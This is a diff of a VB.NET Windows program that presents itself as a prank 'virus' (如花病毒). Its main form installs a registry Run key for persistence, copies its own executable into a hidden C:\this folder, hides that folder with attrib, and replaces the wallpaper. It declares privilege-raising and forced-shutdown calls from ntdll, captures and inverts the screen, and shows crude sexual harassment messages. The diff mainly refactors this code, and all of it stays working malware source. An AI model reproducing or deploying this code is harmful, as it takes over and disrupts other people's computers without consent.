@@ -2,37 +2,39 @@
 Imports System.Drawing
 Imports System.IO
 Imports System.Media.SoundPlayer
-Imports 反色模块
+Imports MPR
 Imports System.Reflection
 Imports System.Collections.Generic
+Imports 如花病毒.Form2.SoundW
 
 Public Class Form2
     Public Declare Function RtlAdjustPrivilege Lib "ntdll" (ByVal Privilege As Long, ByVal Newvalue As Long, ByVal NewThread As Long, ByRef Oldvalue As Long) As Long
     Public Declare Function NtShutdownSystem Lib "ntdll" (ByVal ShutdownAction As Long) As Long
-    Public Declare Function GetWindowDC Lib "user32" (ByVal hwnd As Long) As Long '获得整个屏幕绘制
-    Public Declare Function GetDesktopWindow Lib "user32" () As Long '获得整个桌面绘制
+    Public Declare Function GetWindowDC Lib "user32" (ByVal hwnd As Long) As IntPtr '获得窗体Dc
+    Public Declare Function GetDesktopWindow Lib "user32" () As IntPtr '获得整个桌面绘制
     Public Declare Function SetCursorPos Lib "user32" (ByVal x As Integer, ByVal y As Integer) As Integer '设置鼠标位置。
     Public Declare Function Beep Lib "kernel32" (dwFreq As Integer, dwDuration As Integer) As Integer
-    Public list As New List(Of String) From {"如花正在强建你的电脑", "如花正在强吻你的电脑", "如花正在强暴你的电脑", "嘿嘿嘿嘿"} '集合的表示方法
+    Public list As New List(Of String) From {"如花正在强奸你的电脑", "WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW", "草（日语）", "如花正在强吻你的电脑", "如花正在强暴你的电脑", "嘿嘿嘿嘿", "WTF", "你在想peach", "BigButt最棒！！！"} '集合的表示方法
     Public list2 As New List(Of Brush) From {Brushes.White, Brushes.Yellow, Brushes.Red, Brushes.Pink, Brushes.Green}
     Public list3 As New List(Of FontStyle) From {FontStyle.Regular, FontStyle.Italic, FontStyle.Bold, FontStyle.Underline, FontStyle.Strikeout}
     Public Random As New Random '定义取随机值函数(性能比rnd好，函数不消耗CPU)
     'Public Declare Function PlaySound Lib "winmm.dll" （ByVal lpszSoundName As String， ByVal hModule As Integer， ByVal dwFlags As Integer） As Integer
-    Dim z As Long
-    Dim a As Long
-    Const Do0 = 264
-    Const Re = 297
-    Const Mi = 330
-    Const Fa = 352
-    Const Sol = 396
-    Const La = 440
-    Const Ti = 495
-    Const Do1 = 528
-    Const T4 = 1000
+
+    Private a As Long
+    Enum SoundW
+        Do0 = 264
+        Re = 297
+        Mi = 330
+        Fa = 352
+        Sol = 396
+        La = 440
+        Ti = 495
+        Do1 = 528
+        T4 = 1000
+    End Enum
     Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
-        On Error Resume Next
         a = 0
-        Dim path, ws, fso
+        Dim ws, fso
         ws = CreateObject("wscript.shell") '定义对象
         fso = CreateObject("scripting.filesystemobject") '定义对象
         ws.regwrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\病毒子键", "C:\this\rh.exe", "REG_SZ")
@@ -40,10 +42,6 @@ Public Class Form2
             fso.createfolder("C:\this") '创建文件夹
             fso.CopyFile(Application.ExecutablePath, "C:\this\rh.exe")
             ws.run("cmd.exe /c attrib ""C:\this"" +h", 0) '批处理隐藏文件夹
-
-            'If fso.fileexists("rh.jpg") Then '如果本目录下存在jpg文件则复制到指定目录
-            'fso.copyfile("rh.jpg", "C:\this\rh.jpg")
-            'End If
             ws.regwrite("HKCU\Control Panel\Desktop\Wallpaper", "C:\this\rh.jpg", "REG_SZ") 'Load picture file in regedit.exe
 
             Dim a
@@ -86,7 +84,7 @@ Public Class Form2
             'RtlAdjustPrivilege(&H13, &H1, &H0, &H0) '提升到关机权限
             'NtShutdownSystem(&H0) '关机
             '////////////////////////////////////////////////////////////////
-            '释放程序中的资源文件
+            '将资源写入本地硬盘
             '////////////////////////////////////////////////////////////////
             Dim rh As Byte() = My.Resources.Resource1.bakgroundimage
             Dim s As Stream = File.Create("C:\this\rh.jpg")
@@ -173,7 +171,7 @@ again:
     'End Sub
 
     Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
-        a = a + 1
+        a += 1
         If a = 120 Then
             Timer3.Start()
         ElseIf a = 240 Then
@@ -225,7 +223,7 @@ again:
         Dim temp1 As New Bitmap(scr.WorkingArea.Width, scr.WorkingArea.Height)
         Dim ww As Graphics = Graphics.FromImage(temp1)
         ww.CopyFromScreen(New Point, New Point, scr.WorkingArea.Size)
-        Dim handle As IntPtr = Class1.PContray(temp1).GetHicon
+        Dim handle As IntPtr = Class2.PContray(temp1).GetHicon
         www.DrawIcon(Icon.FromHandle(handle), scr.WorkingArea)
     End Sub
     Sub Icoc()
@@ -270,11 +268,13 @@ again:
     End Sub
 End Class
 Module Program
+#Disable Warning
     Function 加载反色模块(sender As Object, args As ResolveEventArgs) As Assembly
         If New AssemblyName(args.Name).Name = "反色模块" Then
             Return Assembly.Load(My.Resources.反色模块)
         End If
     End Function
+#Enable Warning
     Sub Main()
         AddHandler AppDomain.CurrentDomain.AssemblyResolve, AddressOf 加载反色模块
         Application.EnableVisualStyles()
